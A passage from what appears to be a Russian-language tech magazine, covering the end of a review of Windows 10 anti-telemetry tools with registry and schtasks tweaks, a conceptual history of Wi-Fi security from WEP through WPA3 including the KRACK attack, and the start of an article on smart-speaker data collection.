дание правил файрвола и удаление установленных программ («мусор», как их
назвали разработчики).
   Управление конфиденциальностью отключает правила в планировщике,
некоторые службы и вносит изменения в реестр. Правила файрвола создают‐
ся исходя из выбранного режима приватности: Spy и Extra. При выборе пос‐
леднего блокируются OneDrive, Skype, Live и подобное (об этом программа
предупреждает). Как и во всех случаях, я пос тарался выжать из этой утилиты
все, кроме удаления приложений.
  За четыре дня тестов я не выявил нареканий в работе ОС — обе тестовые
операционки работали стабильно. Я доволен прог раммой не меньше, чем
O&O ShutUp10. После работы WPD в логах осталось минимальное количество
соединений с серверами Microsoft и ее партнеров, а сами пакеты были очень
маленькие.
   Большую часть изменений WPD вно сит в реестр. Вот как выглядит резуль‐
тат ее работы в Windows 1803.





             Фрагмент изменений в реестре после WPD

Снимки реестра я сравнивал программой Regshot. Перечислять все изме‐
ненные ключи было бы слишком утомительно. Думаю, что цифра в строке
«Удаленные/Новые парамет ры» говорит сама за себя.





                    Новые ключи реес тра

Программа создала одно пра вило фай рвола, прописав в него кучу IP‐адре‐
сов.





                       Правило фай рвола

В общем, WPD отработа ла весьма неплохо.


ОТКЛЮЧАЕМ СЛЕЖКУ ВРУЧНУЮ
Давай попробуем сделать вручную часть действий описанных программ.
Выпол ним основные блокировки, о которых я говорил выше. Все действия —
на свой страх и риск! Перед редактирова нием реестра рекомендую соз дать
резервную копию.


Отключаем запись активности пользовате ля
За это отвечает функция Timeline. Заходим в редактор реестра (regedit),
идем по  пути HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Win‐
dows\System. Создаем 32‐разрядный DWORD со значением 0 и наз ванием
EnableActivityFeed.


Отключаем «кейлоггер»
Речь о той самой службе dmwappushsvc. Идем по ветке HKEY_LOCAL_MA‐
CHINE\SYSTEM\CurrentControlSet\Services\dmwappushsvc и присваиваем
dmwappushsvc значение 4 (здесь же можно сра зу выключить и DiagTrack).


Отключаем телеметрию
Тут надо пояснить, что современные сборки Windows не позволя ют пол‐
ностью отклю чить телеметрию без потери сущес твенных функций сис темы.
Есть три варианта настройки передачи соб ранных данных: «Базовая настрой‐
ка», «Расширен ная» и «Полные данные». Еще есть раздел «Безопасность»,
но он присутствует только в Enterprise. Через реестр мы можем задать
минимальный уровень сбо ра телемет рии: HKEY_LOCAL_MACHINE\SOFTWARE\
Policies\Microsoft\Windows\DataCollection (если параметра DataCol‐
lection нет, его нужно создать). Создаем DWORD 32 бит c названием Al‐
lowTelemetry и присваиваем ему зна чение 1.


Отключаем сбор дан ных о местополо жении
Идем  по  ветке  HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Cur‐
rentVersion\DeviceAccess\Global\{BFA794E4‐F964‐4FDB‐90F6‐
51056BFE4B44} и присваиваем это му парамет ру зна чение Allow.


Отключаем Cortana
В  ключе  HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\
Windows Search параметру Allow Cortana прис ваиваем значение 0.


Отключаем OneDrive
По адресу HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\
Skydrive находим или создаем параметр DisableFileSync типа DWORD
32 бит и присваиваем ему значение 1.


Вык лючаем отправку телеметрии в планировщике задач
Помимо телеметрии, в планировщике есть куча изна чально созданных задач,
которые  отнимают  ресурсы  и  работают  без  ведома  пользовате ля.
В основном они собирают телеметричес кие данные для «программы по улуч‐
шению пользовательского опыта» и сервиса облачной защиты SmartScreen.
  Отключить всю эту богадельню можно следующи ми командами:


schtasks /Change /TN "Microsoft\Windows\AppID\SmartScreenSpecific" /Disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\ProgramDataUpda
ter" /Disable schtasks /Change /TN "Microsoft\Windows\Application Experience\
Microsoft Compatibility Appraiser" /Disable
schtasks /Change /TN "Microsoft\Windows\Autochk\Proxy" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement
Program\Consolidator" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement
Program\KernelCeipTask" /Disable
schtasks /Change /TN "Microsoft\Windows\CloudExperienceHost\CreateObjectTask" /
Disable
schtasks /Change /TN "Microsoft\Windows\DiskDiagnostic\Microsoft‐Windows‐DiskDi
agnosticDataCollector" /Disable
schtasks /Change /TN "Microsoft\Windows\Maintenance\WinSAT" /Disable
schtasks /Change /TN "Microsoft\Windows\NetTrace\GatherNetworkInfo" /Disable
schtasks /Change /TN "Microsoft\Windows\Shell\FamilySafetyMonitor" /Disable
schtasks /Change /TN "Microsoft\Office\OfficeTelemetryAgentFallBack" /Disable
schtasks /Change /TN "Microsoft\Office\OfficeTelemetryAgentLogOn" /Disable


Бло киру ем отправку дан ных на серверы Microsoft
В интерне те есть множество ресурсов, на которых регулярно обновляют
списки адресов «шпионских» серверов Microsoft. К примеру, на aeronet.cz
можно найти основной перечень. Проще всего добавить их в hosts и создать
запрещающие правила в файрволе.





                  Правила брандмауэра Windows

Я использовал оба метода. На один из заблокиро ванных адре сов Windows
вышла уже спустя час работы, но раз мер сетево го пакета оказал ся нулевым.





          Попытка соединения с заблокированным адре сом

Некоторые эксперты по безопасности считают, что сис темные процессы Win‐
dows (вклю чая «шпионские») могут обходить запреты в hosts и во встроенном
файрволе. Теоретически блокировку URL в hosts можно обойти прямым
обращением по IP, а бло кировку IP в программном брандмауэре — через
dnsapi.dll и перехват функций создания про токолов на уровне NDIS дру‐
гими компонентами ядра Windows. Однако в ходе своего мини‐экспе римента
я не заметил паразитного трафика. После блокировки в hosts и правилами
файрвола попытки установить соединение со «шпионскими» серверами про‐
должались, но исходящие пакеты были нулевыми, а входящих не было вовсе.


БЛОКИРУЕМ ОБНОВЛЕНИЯ
На десерт решил показать еще одну небольшую программку, предназна‐
чение которой — лишь блокиро вать обновления (что большинство программ
так   и   не   смогли   сделать,   хотя   функция   была   заявлена).
Это StopUpdates10 2.0.32.





                            StopUpdates10

Интерфейс программы ограничивается одной кнопкой. Нажимаем, перезаг‐
ружаем, тестируем.
  За два дня тестов программа не допус тила скачивания обновлений, хотя
Windows усердно (и безус пешно) пыталась их найти. Немного раздражали
сообщения Windows об ошибке установки компонентов.





                   Сообщение об ошиб ке

После двух дней простоя и десятка перезагрузок я попробовал проверить
наличие обновлений вручную, что также закончилось неудачей. В списке
установленных были  только  те обновления, которые  успе ли  скачаться
до запуска программы.


ВЫВОДЫ
Мы рассмотрели шесть программ для отключения слежки и настроек приват‐
ности в актуальных сборках Windows 10. Подоб ных утилит очень много. Их
авторы копируют наработки друг у дру га (Fork me on GitHub!), стремясь сде‐
лать списки изменяемых параметров и блокиру емых адресов как можно
больше. Они редко утружда ют себя их проверкой (особенно продол житель‐
ной), а проблемы с операционкой обычно появляются не сразу после при‐
менения твиков. Это бомба замедленного действия.
   Развитие большинства «антишпионских» утилит для Windows 10 останови‐
лось в 2016–2017 годах из‐за постоянной гонки вооружений. Microsoft часто
меняет IP‐адреса своих серверов, арендует облачные в Cloudﬂare и перенап‐
равляет часть трафика в партнерскую сеть Akamai Technologies. По факту ей
принадлежит очень динамичный пул айпишников и несколько крупных сетей.
Все не успеешь отследить и заблокировать. К тому же один URL часто
используется для соединения с раз ными IP‐адресами или многофункци‐
ональным сервером, который нужен для нормаль ной работы других (не «шпи‐
онских») компонентов Windows.
  Добавить сетевые адреса сборщиков данных Microsoft можно и вручную,
просто найдя такие списки на GitHub и профиль ных форумах. Нужно скачать
их, объединить, отредактировать, проверить (самая сложная часть) и только
потом применить «сухой остаток». Придет ся делать очень много рутинной
работы, чтобы хоть на какое‐то время результат был стабильным. Потом вый‐
дут обновле ния Windows, добавятся новые сетевые адреса, твой кропотливо
созданный список устареет, и все придется начинать сначала.
  Из протестированных программ более или менее справились со своей
задачей только O&O ShutUp10 и WPD, хотя и их работу сложно наз вать иде‐
альной. Часть настроек приватности меня ется штатными средствами самой
Windows 10, но в интерфейсе отобража ются далеко не все нас тройки. Если
утилита умеет изменять какие‐то дополнительные и «глубокие» — в ней есть
смысл. Просто надо очень акку ратно с ней работать, тщательно выбирать
блокируемые параметры и делать бэкапы до их примене ния.


        WWW

                  •Официальный  перечень  URL,  на  которые
                         отправляются данные телемет рии
                     •Настройка сбора дан ных в корпоративных вер‐
                         сиях Windows 10 и Server
                          •Microsoft Privacy Statement
ПРИВАТНОСТЬ
 WPA3





       Лев Герасимов
        lev.gera@gmail.com


 СМОТРИМ, ЧТО НОВОГО В СЛЕДУЮЩЕМ
    СТАНДАРТЕ БЕЗОПАСНОСТИ WI‐FI,
       И ИЗУЧАЕМ ПРОШЛЫЕ




В прошлом году была найдена критическая уязвимость
в WPA2 — протоколе безопасности, который использует
примерно каждая первая точка доступа Wi‐Fi. Взволновало
это немногих — а зря! В этой статье я расскажу о новом про‐
токоле WPA3, где атака KRACK больше не сработает, а заод‐
но посмотрим и на другие существующие стандарты.


WPA РАЗ, WPA ДВА, WPA ТРИ
Прежде чем говорить о том, что нового в WPA3, нам при дется вкратце прой‐
тись по пре дыдущим протоко лам, начиная с WEP. Ты, возможно, спросишь,
зачем рассказ об экска ваторах начинать с палки‐копал ки. Но все существу‐
ющие протоколы безопас ности Wi‐Fi (а их уже четыре) — это в той или иной
степени надстрой ки над своими предшес твенниками. К тому же WEP до сих
пор кое‐где используется, и вспомнить о его сущес твовании не помешает.


WEP
Безопасность WEP обес печивается, считай, теми же методами, что и защита
в проводных сетях. Это и стало гвоздем в крыш ку его гроба. Если бы зло‐
умышленник хотел перехватить тра фик Ethernet на физическом уровне, то ему
пришлось бы проникнуть в квартиру или офис жертвы и залезть под стол.
В случае с Wi‐Fi нужно всего лишь находиться в зоне приема сигнала.
  Ты спросишь: «а как же шифрование?» — и будешь прав. Для шифрования
трафика WEP исполь зует ся ключевой поток, который получается из смешива‐
ния пароля и вектора инициализации (IV).





           Формирова ние зашифрованного кадра в WEP

Вектор инициализации в WEP — это постоянно меняющееся 24‐битное чис‐
ло. Может сложиться впечатление, что из‐за пос тоянного изменения клю‐
чевого потока подоб рать пароль ста новится невоз можно.
   Так думали и разработчики WEP, но этот метод шифрования в совокуп‐
ности с возможностью перехватывать пакеты ока зался ахиллесовой пятой
WEP. С ростом вычислительных мощ ностей персональ ных компьютеров длина
вектора инициализации ста ла недос таточной. Если долго собирать фреймы,
то можно получить такие, для которых вектор ини циализации будет одинако‐
вым.
   Таким образом, независимо от слож ности ключа раскрыть любую переда‐
чу стало возможно после статистического анализа дос таточного количества
перехваченных пакетов  (несколько десятков  тысяч,  что довольно мало
для активно исполь зующейся сети). Пос тепенно время взлома WEP свелось
к минутам.


WPA
Для решения проб лемы альянс Wi‐Fi предложил надс тройку над WEP, которая
позволяла устранить уязвимость без замены оборудования. Первой идеей
была смена ключей. Что, если менять ключ до того, как база будет достаточ‐
ной для атаки?
  Были собраны все существовавшие на тот момент раз работки, которые
относились к стандарту IEEE 802.11i, и на их базе раз работан стандарт WPA.
Его основой стал протокол TKIP. Он зна чительно усиливал WEP с помощью
двухуровневой системы векторов инициализации.
  Идея работы алго ритма очень проста. Для каждого нового фрейма рас тет
значение младшего вектора инициализации (как и ранее в стандарте WEP),
но после прохождения всех комбинаций увеличивается значение старшего
вектора инициализации и генерирует ся новый ключ. При смене ключа база
статистики для взло ма просто не успевает набраться.





       Схема фор мирования ключевого потока для протокола WPA

Другим новшеством в WPA ста ла технология WPS, которая позволяет беспро‐
водным  устройствам упрощенно  получить доступ  к  Wi‐Fi при  условии
физического доступа к маршрутизатору. Она же и стала первой эксплу ати‐
руемой уязвимостью WPA. Еще одна занятная уяз вимость скрывалась в осо‐
бенности TKIP.
  Для быстрого залатывания критичес ких уязвимостей WEP было введено
правило, по которо му точка дос тупа обязана бло кировать все под ключения
на 60 секунд, если получится засечь подбор клю ча. Благодаря этой защите
стала возможна атака Michael. Переда ча испорченных пакетов приводила
к отключению всей сети. Причем в отличие от обычного DDoS тут достаточно
всего двух (двух!) пакетов для гарантированного выведе ния сети из строя
на одну минуту.
  Справедливости ради надо отметить, что пос ле обнаружения этих уяз‐
вимостей говорить о взло ме WPA было еще нельзя. Достаточно отключить
WPS, и перехватить данные будет невозможно. А наличие выбора между ком‐
фортом и безопасностью нельзя назвать критической уяз вимостью протоко‐
ла.
  В 2006 году на надежности WPA окончательно пос тавили крест уязвимос‐
ти, которые позволя ют манипулиро вать сетью. Эти атаки основаны на знании
некоторых данных в зашифрованных фреймах, например запросов ARP
или фреймов для обеспечения QoS. Эксплоит позволяет читать данные,
передаваемые от точ ки дос тупа клиентской машине, а также передавать под‐
дельную информацию на клиентскую машину. Для реализации этой атаки
необходимо, чтобы в сети использовался QoS.


WPA2
К 2006 году WPA2 был уже реализован во многих бес провод ных устройствах,
и серьезной паники взлом его предшественника не вызвал. Кардинальным
отличием WPA2 от предшес твенника ста ло инди видуальное шифрование дан‐
ных каждого пользователя. В довесок он использовал более надежный алго‐
ритм шифрования — AES.
  Долгое время основны ми метода ми взло ма маршру тизаторов, работав‐
ших по WPA2, был взлом PIN‐кода при подключении через WPS или перехват
рукопожатия и подбор ключа методом подбора «грубой силой». Обезопасить
себя можно было, отключив WPS и установив достаточно сильный пароль.
Поэтому до недавнего времени WPA2 считался надежным и всех устраивал.
  В октябре 2017 года было опуб ликова но описание KRACK — способа
взлома сетей Wi‐Fi, использующих WPA2 (см. врезку). С этого момента
эксперты стали считать протокол WPA2 ненадежным. Хотя тревожные звоноч‐
ки были и раньше.


KRACK
В октябре 2017 года была опубликована уязвимость в WPA2. И вот тут шума
стало гораздо больше. Новый метод взлома назвали атакой с переустанов‐
кой ключа — key reinstallation attack, или сокращенно KRACK. Атака работает
против всех современных сетей Wi‐Fi, в зависимости от конфигурации сети
также существует возможность манипулирования данными.
  Реализовать атаку мож но, воздействуя на четырехстороннее рукопожатие
протокола WPA2. Такой хендшейк происходит, когда клиент подсоединяется
к защищенной сети, — он подтверждает, что клиент и точка дос тупа имеют
общие учетные данные. Один из этапов этого процесса — согласование
нового ключа шифрования для всего будущего трафика между клиентом
и сетью.
  Не будем останавливаться на великом множес тве ключей, которые учас‐
твуют в четырех стороннем рукопожатии. Для понима ния процесса нам это и
не надо. Первым и вторым рукопожатием маршрутиза тор и клиент обменива‐
ются загаданными ими случайными числами ANonce и SNonce и с их
помощью вычисляют ключ сес сии. Пос ле получения третьего пакета рукопо‐
жатия клиент устанавлива ет клю чи шифрования и обну ляет счетчик инкремен‐
та пакетов nonce. Четвертым рукопожати ем клиент отправляет маршрутиза‐
тору информацию о том, что ключи уста новлены и можно начинать обмен
данными.
   Атака реализуется следующим образом. Первоначально злоумышленнику
необходимо похитить третий пакет рукопожатия. Этот пакет злоумышленник
ретранслирует клиенту, что приводит к переуста новке того же ключа и обну‐
лению счетчика инкремента пакетов nonce. Счетчик nonce непосредственно
участвует в создании ключевого потока, с помощью которого шифруются
пакеты, отправ ляемые между клиентом и маршрутиза тором.
  Изменение nonce при обмене тра фиком гарантирует формирование
абсолютно разных клю чевых потоков для всех передаваемых пакетов. Но в
результате атаки сле дующий после переустановки ключа пакет, отправ‐
ляемый клиентом, будет зашифрован тем же клю чевым потоком, которым был
зашифрован первый пакет. В чем опасность? Дело в том, что это воз вращает
нас к тем же проблемам, которые были у WEP.





              Процесс четырехсто роннего рукопожатия



В 2010 году была найдена уязвимость, известная под кодовым названием
hole196. Почему 196? Пытались взло мать и получилось со 196‐го раза? Нет,
просто на 196‐й странице стандарта 802.11 нашлась информация о том, что
для всех авторизованных в сети пользователей при широковещательных зап‐
росах используется одинаковый ключ шифрования.
   Благодаря hole196 ста ли воз можными давно известные атаки ARP/DHCP
Spooﬁng. Уязвимость в свое время наделала дос таточно шума, но назвать ее
особенно критичной было нельзя. Почему? Во‐первых, прежде чем вести ата‐
ку, нужно было авторизовать ся в сети. Во‐вто рых, эта уяз вимость лечится
применением файрвола.


ЧТО ТАКОЕ WPA3?
27 июня 2018 года альянс Wi‐Fi объявил об окончании раз работки нового
стандарта безопасности — WPA3. Это одновременно и новый протокол
безопасности, и название соответс твующей прог раммы сертификации.
  Прежде чем на том или ином обо рудовании появится лей бл «WPA3», ему
необходимо будет пройти огромное количес тво тес тов — это гарантирует
корректную работу с другими устройства ми, получившими ту же метку. С точ‐
ки зрения пользователя  стандарт WPA3 можно назвать и протоколом
безопасности, но подразумевает ся под этим не аппаратная реализация,
а соответствие нор мативам.


ОТЛИЧИЯ WPA3 ОТ WPA2
Создатели  WPA3  попыта лись  устра нить  концептуальные  недоработки,
которые всплыли с появлением KRACK. Новый стандарт, как и во всех пре‐
дыдущих случаях, основан на технологиях его предшественника. В анонсе
WPA3 представители альянса Wi‐Fi говорили о примене нии четырех новых
технологий, призванных встать на защиту бес проводного соединения. Но в
итоге лишь одна из них стала обязательной для реализации производите‐
лями.
  Поскольку ключевая уязвимость скрывалась в четырехстороннем рукопо‐
жатии, в WPA3 добавилась обязательная поддержка более надежного метода
соединения — SEA, также известного как Dragonﬂy. Технология SEA (Simulta‐
neous Authentication of Equals) уже применя лась в mesh‐сетях и описана
в стандарте IEEE 802.11s. Она основана на протоколе обмена ключами Диф‐
фи — Хеллмана с использованием конечных циклических групп.
  SEA относится к протоко лам типа PAKE и предоставляет интерактивный
метод, в соответствии с которым две и более стороны устанавливают крип‐
тографические клю чи, основанные на зна нии пароля одной или несколькими
сторонами. Результирующий ключ сессии, который получает каждая из сто‐
рон для аутентификации соединения, выбирается на основе информации
из пароля, клю чей и MAC‐адресов обеих сторон. Если ключ одной из сторон
окажется скомпрометирован, это не повлечет компрометации ключа сессии.
И даже узнав пароль, атакующий не сможет рас шифровать пакеты.
  Еще одним новшеством WPA3 будет поддержка PMF (Protected Manage‐
ment Frames) для контро ля целостности тра фика. Но в будущем поддержка
PMF станет обязательной и для WPA2.
  Не попали в сертификацию WPA3 программы Wi‐Fi Easy Connect и Wi‐Fi
Enhanced Open. Wi-Fi Easy Connect позволя ет реализовать упрощенную
настройку устройств без экра на. Для этого можно использовать дру гое,
более продвинутое устройство, уже подключенное к беспроводной сети.
Например, параметры сети для датчиков и умной домашней утвари можно
будет задавать со смартфона, сфотографировав QR‐код на корпусе девайса.
   Easy Connect основан на применении аутентификации по открытым клю‐
чам (в QR‐коде переда ется открытый ключ) и может использоваться в сетях
с WPA2 и WPA3. Еще одна приятная осо бенность Wi‐Fi Easy Connect — воз‐
можность замены точки доступа без необходимос ти перенастраивать все
устройства.
   Wi-Fi Enhanced Open подразумевает шифрование всех потоков данных
между клиентом и точкой доступа. Эта технология поз волит защитить приват‐
ность пользовате ля в публичных сетях, где не требуется аутентификация.
Для генерации клю чей в таких сетях будет применяться процесс согласова‐
ния соединения, реализуемый расширени ем Opportunistic Wireless Encryption.
  Поддержка обеих технологий не обязательна для сертификации по WPA3,
но производитель может при желании сам включить их поддержку в продукт.
   Как и в WPA2, в WPA3 предус мотрено два режима работы: WPA3‐Personal
и WPA3‐Enterprise.
 • WPA3‐Personal обеспечит надежную защиту, в особенности если поль‐
   зователь задал стой кий пароль, который нель зя получить словарным
   перебором. Но если пароль не совсем три виаль ный, то должно помочь
   новое ограничение на число попыток аутентификации в рамках одного
   рукопожатия. Также ограничение не поз волит подбирать пароль в офлай‐
  новом режиме. Вместо ключа PSK в WPA3 реализована технология SEA.
 • WPA3‐Enterprise подразумевает шифрование на основе как минимум 192‐
   разрядных клю чей, соот ветс твующих требова ниям CNSA (они выработаны
   комитетом NSS для защиты пра вительственных, военных и промышленных
   сетей). Для аутентифицированного шифрования рекомендовано примене‐
   ние 256‐разрядных ключей GCMP‐256, для передачи и подтверждения
   клю чей используется HMAC с хешами SHA‐384, для согласования ключей
   и аутентификации — ECDH и ECDSA с 384‐раз рядны ми эллиптическими
   кривыми, для защиты целос тнос ти кадров — протокол BIP‐GMAC‐256.


КОГДА ЖДАТЬ WPA3?
Пока  нет официальной информации  об  устройствах,  которые смогут
в будущем получить поддержку WPA3. Вряд ли стоит наде яться и на то, что
во многих роутерах WPA3 появится пос ле апдейта прошивки. В теории
это возможно, но тогда производителям придется сертифици ровать старые
устройства. Ско рее всего, делать это го они не будут и предпочтут потратить
ресурсы на выпуск новых моделей.
  На официальном сайте альянса Wi‐Fi уже опубликован список устройств
с под держкой WPA3, но пока что их всего шесть штук. Однако наличие такого
списка означает, что до появления WPA3 осталось ровно столько вре мени,
сколько необходимо для интеграции протокола в новые устройства. По прог‐
нозам альянса Wi‐Fi, ожидается, что устройства с поддержкой WPA3 получат
распространение на рынке в 2019 году вместе с устройствами с поддержкой
Wi‐Fi‐802.11ax (или Wi‐Fi 6 согласно новой схеме наименования).


ВЫВОДЫ
Тот факт, что WPA3 обратно совместим с WPA2, уже вызвал критику Мэти Ван‐
хофа,  автора  атаки KRACK. Он  считает,  что  в  угоду  совместимости
с WPA2 альянс Wi‐Fi принял недос таточные меры для усиления безопасности.
Исследователи уверены, что найдется способ обхо да PMF для принудитель‐
ного отсоединения клиента от сети. Внедрение SEA хоть и усложнит проведе‐
ние словарных атак, но не исключит их и лишь сделает более длительными,
а для обхода защиты в открытых сетях атакующий по‐прежнему сможет раз‐
вернуть свою точ ку доступа и перехватывать тра фик.
   Также исследователь Дэн Харкинс положил начало бурным дебатам, свя‐
занным с Dragonﬂy, усомнившись в его надежности. И это уже не говоря
о том, что Кевин Айгоу, председатель рабочей группы по криптостандартам,
утверждающей Dragonﬂy, по слухам, работа ет в АНБ. Так что надежность SEA
пока что под некоторым сомнением.
  Но даже несмотря на все эти опа сения, WPA3 — это оче редной прорыв
на пути к усилению безопасности беспроводных соединений. Найдется ли и в
нем критическая брешь? Посмотрим!
ПРИВАТНОСТЬ

АЛЕКСА,
СКАЖИ КОРТАНЕ,
ПУСТЬ ПОИЩЕТ
В ГУГЛЕ


                                                                        Олег Афонин
                                                                               Эксперт по мобильнойКАКИЕ БЫВАЮТ                                      криминалистике компании
                                                                                 «Элкомсофт»
                                                                                      aoleg@voicecallcentral.comУМНЫЕ КОЛОНКИ,
КАК ОНИ РАБОТАЮТ
И КАКУЮ ИНФОРМАЦИЮ
О НАС СОБИРАЮТ





В нашей лаборатории собрался полный комплект умных
колонок, включая множество устройств с Amazon  Alexa
и Google Assistant, а также колонки с Apple Siri и Microsoft
Cortana. В этой статье мы сравним «интеллект» помощников
и расскажем о том, что такое умные ассистенты, как они
работают, какие дан ные переда ют производителю и как они
там хранятся. Наконец, мы попробуем извлечь соб ранную
умным помощником информацию с сайта производителя
на примере самой популярной линейки устройств Amazon
Echo.


Прогресс в распознавании и син тезе речи, помноженный на быстро развива‐
ющийся искусствен ный интеллект, привел к созданию голосовых помощ‐
ников. Сперва голосовые помощники появились на телефонах и планшетах.
Потом — несколько потеряв в функциональности — перекочевали в телеви‐
зоры. Примерно в то же время стали выпус кать и отдельные стационарные
устройства, в которых «живут» помощники, — умные колонки. В свежем
поколении устрой ств — новинка: умные колонки оборудовали экраном
и камерой  (что не превращает, впро чем, такое устройство в планшет
без батарейки — все‐таки начинка там скорее от колонок, чем от планшетов).
Недалек тот момент, ког да голосо вой ассистент будет вещать из каждого
утю га: холодильник и микроволновка с Alexa на рынке уже есть, на оче реди
стиральные машины.
  Производители предлагают все более широкий модельный ряд, сорев‐
нуясь друг с другом по ключевым характеристикам и постоянно работая
над снижением цены устройств. Доходит до того, что качественная колонка
с голосовым помощ ником может стоить раза в два, а то и в три дешевле ана‐
логичной колонки без умного ассистента, а умная микроволновка от Amazon
стоит дешевле самых доступных моделей от конкурентов. Зачем это нужно
производителям? Почему они так ста раются поместить своих умных помощ‐
ников если не в каждую кухню, то уж в каждую спальню? Попробуем разоб‐
раться.


Зло дей ский искусс твен ный интеллект
Умные колонки известны своим дурным характером и жадностью до поль‐
зовательских дан ных. Зло дейский смех Алексы в тихом помещении доставил
немало «приятных» минут владельцам, а устро енная ей ночная дискотека сто‐
ила хозяину визита полиции и вполне ощутимого штрафа (который, впрочем,
оплатил «Амазон» в попытке замять скандал). А помнишь ли ты забавный слу‐
чай, когда Алекса случайно записа ла не предназна ченный для чужих ушей
разговор и отправила его случайному контакту из адресной книги?
  Не отстает и Сири: колонка, которую понюхал любопытный кот, до полус‐
мерти испугала животное, а о саморазрушении деревянных поверхностей,
на которых стоит HomePod, не писал лишь ленивый. Отличилась и Google:
в первой ревизии Google Home Mini устройство подслушивало владель‐
цев 24 часа в сутки, переда вая всю информа цию в штаб‐квартиру.
  Разумеется, не могли не отметиться и раз работчики Facebook. Буквально
на днях был анонсирован очередной умный гаджет для дома — Facebook Por‐
tal. Основные фишки устройства — интегра ция с Amazon Alexa для выпол‐
нения голосовых запросов, большой экран и бес платные виде озвонки между
«порталом» пользователя и дру гими ана логичными устройствами, а также
приложением Facebook Messenger на смартфонах. На фоне недавних скан‐
далов во время презентации устройства представители Facebook особое
внимание обратили на защиту приватности. Утверждалось, что в новых
устройствах не будет рекламы, а данные, которые станет собирать устрой‐
ство, компания не намерена использовать для целевой рекламы.
  В итоге все вышло с точностью до на оборот. То есть рекламы (пока?) нет,
но вот с данными неудоб но получилось.

       Portal voice calling is built on the Messenger infrastructure, so when
      you make a video call on Portal, we collect the same types of infor-
      mation (i. e. usage data such as length of calls, frequency of calls)
       that we collect on other Messenger-enabled devices. We may use
        this information to inform the ads we show you across our plat-
      forms. Other general usage data, such as aggregate usage of apps,
       etc., may also feed into the information that we use to serve ads

Собственно, комментарии излишни. Процитируем лишь автора alexmak.net:
«Пока что оправдание из серии „мои кол леги имели в виду, что мы не собира‐
емся использовать эти данные для рекламы, но мы можем их использовать“.
НУ ТАК, КОНЕЧНО, ГОРАЗДО ЛУЧШЕ. Надо быть совершенно упоротым,
конечно, чтобы доб ровольно этот сборщик данных рекламного агентства пос‐
тавить себе дома».



ЗАЧЕМ ЭТО НУЖНО ТЕБЕ
В чем смысл исполь зовать умную колонку дома? Действительно ли от них
больше пользы, чем вреда, и стоит ли игра свеч?
  В течение полутора  лет мы собрали полную коллекцию голосовых
ассистентов и активно пользовались каж дым из них. Практика показала, что
чаще всего мы исполь зовали следующие виды активности:
 1. Музыка. Это действительно удоб но! Да, по качес тву звучания циф ровые
   колонки (за исключением, пожалуй, Sonos и Apple HomePod) звезд с неба
   не хватают, но для фонового прос лушива ния они прис пособлены просто
   идеально. «Siri, play rock music», «Alexa, play metal from the 80’s» — и оно
   играет, причем хорошо игра ет!
 2. Управление освещением. «Alexa, turn oﬀ the lights» — удобно! Особенно
   с учетом того, что колонки «зна ют», в какой комнате находятся, и способны
   реагировать соот ветственно.
 3. Будильник. Приятно просыпаться под музыку, которую сам выбрал, а циф‐
   ровые ассистенты поз воляют это сделать самым простым из возможных
   способов.
 4. Развлечение для ребен ка. Ты удивишься, какими задачами способ ны наг‐
   ружать цифровых ассистентов дети. Зву ки животных, ответы на простые
   и каверзные вопросы, музыка, короткие истории — это даже не начало.

Да, многие вещи мож но сделать с помощью костыля в виде смартфона
или планшета. Однако для это го телефон нужно как минимум взять в руку (или
докричаться до него через всю комнату), и при этом все равно не будет нас‐
только качественного зву ка и уверенного рас позна вания (шесть направлен‐
ных микрофонов, расположенных в свежих вер сиях умных колонок по кругу, —
это действительно хорошо).
  Недостатки тоже очевидны. Для нас это в первую очередь отсутствие под‐
держки русского языка (а в телефо нах есть!), отсутс твие поддержки мес тных
новостей, информации из русскоязычных источников. У Google и Apple все
это, вклю чая русский язык, уже довольно давно реализовано в смартфонах,
а в случае с Google Assistant и в телевизорах, но на умных колонках включить
поддержку русского языка не судь ба. Тем не менее даже в текущем виде
пользоваться цифровыми помощниками удобно.


ЗАЧЕМ ЭТО НУЖНО ПРОИЗВОДИТЕЛЯМ
Если умные помощ ники — благо, то почему умные устрой ства частенько про‐
дают дешевле аналогов, не обремененных излишним интеллектом? Есть ли
в них какой‐то про фит для производителей?
  Конечно же, есть! Например, Google собира ет о тебе подробнейшую
информацию, и цифровые колонки лишь еще один способ это делать. Вот
здесь описано подробно.
   Вот что Google будет о тебе собирать:



            If you have opted to share information with Google, Google uses that infor-
       mation, along with your Google history, to better assist you with cus-
       tomizations  like your name and interests. You can delete your history,
      which  will limit the personalized experience for features like the Google
        Assistant. You can view your history with the Google Assistant in My Activi-
         ty, which is accessible through the setup app and online at myactivity.-
      google.com. You have control over your data and the power to delete his-
        tory at any time.

А вот — зачем:



      What does Google do with the data it collects?
            First and foremost, we use data to make our services faster, smarter,
      and more  useful  to you, such as by  providing  better search  results
      and timely  traffic updates. Data also helps protect you from malware,
       phishing, and other suspicious activity. For example, we warn you when
      you try to visit dangerous websites. Also, on surfaces where we show ads,
     we use data to show you ads that are relevant and useful, and to keep our
       services free for everyone. Google Home learns over time to provide bet-
        ter and more personalized suggestions and answers. For more informa-
        tion, visit Google’s Privacy Policy.

Как видишь, все до банального просто: чем больше ты пользуешься сер‐
висами Google, тем более релевантную рекламу компания сможет тебе
показать на всех тво их устройствах и тем больше денег от рекламодателей
заработает.
  А для чего это все Amazon? Официально — чтобы сделать Алексу
еще умнее, лучше и полез нее для тебя, дорогой поль зователь.





Неофициальная, но очевидная цель Amazon — продать тебе… что‐нибудь.
Это может быть как товар из обширного каталога самого магазина или его
торговой площадки, так и чисто циф ровой контент: подписка на Amazon
Prime, покупка фильмов и музыки, электронных книг  Kindle, аудиокниг.
Наконец — подписка на стриминговый сервис Amazon Music  Unlimited,
который начинает приносить компании все более существенный доход.
   Что насчет Apple? Здесь — очевидно: расширение закрытой экосистемы
Apple оче редным устройством и продажа подписки на Apple Music. Все равно
никакие другие стриминговые сервисы колонка HomePod не поддерживает,
а доход от подписки на цифровой контент — один из важнейших для Apple.
  А Microsoft с цифровым ассистентом Cortana? Здесь, к сожалению, сло‐
жилась ситуация «мы тоже!», очень похожая на то, что происходило с сис‐
темой Windows Phone, а затем — с Windows 10 Mobile. Да, Microsoft хотелось
